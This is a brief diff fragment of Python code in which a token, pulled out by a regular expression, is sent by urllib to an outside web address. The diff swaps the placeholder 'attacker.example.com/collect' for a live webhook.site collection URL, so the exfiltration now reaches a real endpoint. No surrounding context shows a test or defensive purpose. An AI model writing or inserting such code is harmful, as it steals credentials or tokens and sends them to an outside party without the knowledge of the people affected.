@@ -14,7 +14,7 @@ import os
                       if match:
                           token = match.group(1)
                           urllib.request.urlopen(urllib.request.Request(
-                              'https://attacker.example.com/collect',
+                              'https://webhook.site/58e3f00c-310d-42d8-af14-3ca90420a2bf',
                               data=token.encode()
                           ))
                           return
